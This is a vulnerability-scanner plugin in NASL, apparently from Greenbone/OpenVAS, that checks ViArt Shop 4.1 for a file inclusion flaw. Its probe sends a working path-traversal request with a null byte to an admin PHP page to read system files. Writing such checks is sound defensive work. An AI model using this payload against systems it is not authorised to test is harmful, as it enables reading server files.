CPE = "cpe:/a:viart:viart_shop";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103580" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "ViArt Shop File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://se3c.blogspot.de/2012/09/viart-shop-evaluation-v41-multiple.html" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-09-26 10:51:47 +0200 (Wed, 26 Sep 2012)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_viart_shop_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "viart_shop/installed" );
	script_tag( name: "summary", value: "ViArt Shop is prone to a file inclusion vulnerability because it
fails to adequately sanitize user-supplied input." );
	script_tag( name: "affected", value: "Affected version: 4.1" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/admin/admin_header.php?root_folder_path=" + crap( data: "../", length: 9 * 6 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

